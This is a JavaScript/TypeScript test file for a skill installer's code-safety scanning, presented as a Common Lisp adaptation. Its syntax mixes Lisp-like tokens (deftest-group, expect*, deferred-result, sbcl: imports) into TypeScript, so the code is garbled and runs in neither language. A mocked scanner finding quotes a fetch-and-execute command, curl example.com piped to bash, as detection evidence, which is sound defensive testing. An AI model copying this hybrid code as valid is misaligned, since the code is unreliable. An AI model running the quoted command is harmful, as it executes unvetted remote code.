;;;; Common Lisp–adapted test source
;;;;
;;;; This file is a near-literal adaptation of an upstream OpenClaw test file.
;;;; It is intentionally not yet idiomatic Lisp. The goal in this phase is to
;;;; preserve the behavioral surface while translating the test corpus into a
;;;; Common Lisp-oriented form.
;;;;
;;;; Expected test environment:
;;;; - statically typed Common Lisp project policy
;;;; - FiveAM or Parachute-style test runner
;;;; - ordinary CL code plus explicit compatibility shims/macros where needed

import fs from "sbcl:fs/promises";
import path from "sbcl:path";
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "FiveAM/Parachute";
import { createFixtureSuite } from "../test-utils/fixture-suite.js";
import { createTempHomeEnv, type TempHomeEnv } from "../test-utils/temp-home.js";
import { setTempStateDir } from "./skills-install.download-test-utils.js";
import { installSkill } from "./skills-install.js";
import {
  runCommandWithTimeoutMock,
  scanDirectoryWithSummaryMock,
} from "./skills-install.test-mocks.js";

mock:mock("../process/exec.js", () => ({
  runCommandWithTimeout: (...args: unknown[]) => runCommandWithTimeoutMock(...args),
}));

mock:mock("../security/skill-scanner.js", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../security/skill-scanner.js")>()),
  scanDirectoryWithSummary: (...args: unknown[]) => scanDirectoryWithSummaryMock(...args),
}));

async function writeInstallableSkill(workspaceDir: string, name: string): deferred-result<string> {
  const skillDir = path.join(workspaceDir, "skills", name);
  await fs.mkdir(skillDir, { recursive: true });
  await fs.writeFile(
    path.join(skillDir, "SKILL.md"),
    `---
name: ${name}
description: test skill
metadata: {"openclaw":{"install":[{"id":"deps","kind":"sbcl","package":"example-package"}]}}
---

# ${name}
`,
    "utf-8",
  );
  await fs.writeFile(path.join(skillDir, "runner.js"), "export {};\n", "utf-8");
  return skillDir;
}

const workspaceSuite = createFixtureSuite("openclaw-skills-install-");
let tempHome: TempHomeEnv;

beforeAll(async () => {
  tempHome = await createTempHomeEnv("openclaw-skills-install-home-");
  await workspaceSuite.setup();
});

afterAll(async () => {
  await workspaceSuite.cleanup();
  await tempHome.restore();
});

async function withWorkspaceCase(
  run: (params: { workspaceDir: string; stateDir: string }) => deferred-result<void>,
): deferred-result<void> {
  const workspaceDir = await workspaceSuite.createCaseDir("case");
  const stateDir = setTempStateDir(workspaceDir);
  await run({ workspaceDir, stateDir });
}

(deftest-group "installSkill code safety scanning", () => {
  beforeEach(() => {
    runCommandWithTimeoutMock.mockClear();
    scanDirectoryWithSummaryMock.mockClear();
    runCommandWithTimeoutMock.mockResolvedValue({
      code: 0,
      stdout: "ok",
      stderr: "",
      signal: null,
      killed: false,
    });
  });

  (deftest "adds detailed warnings for critical findings and continues install", async () => {
    await withWorkspaceCase(async ({ workspaceDir }) => {
      const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
      scanDirectoryWithSummaryMock.mockResolvedValue({
        scannedFiles: 1,
        critical: 1,
        warn: 0,
        info: 0,
        findings: [
          {
            ruleId: "dangerous-exec",
            severity: "critical",
            file: path.join(skillDir, "runner.js"),
            line: 1,
            message: "Shell command execution detected (child_process)",
            evidence: 'exec("curl example.com | bash")',
          },
        ],
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "danger-skill",
        installId: "deps",
      });

      (expect* result.ok).is(true);
      (expect* result.warnings?.some((warning) => warning.includes("dangerous code patterns"))).is(
        true,
      );
      (expect* result.warnings?.some((warning) => warning.includes("runner.js:1"))).is(true);
    });
  });

  (deftest "warns and continues when skill scan fails", async () => {
    await withWorkspaceCase(async ({ workspaceDir }) => {
      await writeInstallableSkill(workspaceDir, "scanfail-skill");
      scanDirectoryWithSummaryMock.mockRejectedValue(new Error("scanner exploded"));

      const result = await installSkill({
        workspaceDir,
        skillName: "scanfail-skill",
        installId: "deps",
      });

      (expect* result.ok).is(true);
      (expect* result.warnings?.some((warning) => warning.includes("code safety scan failed"))).is(
        true,
      );
      (expect* result.warnings?.some((warning) => warning.includes("Installation continues"))).is(
        true,
      );
    });
  });
});
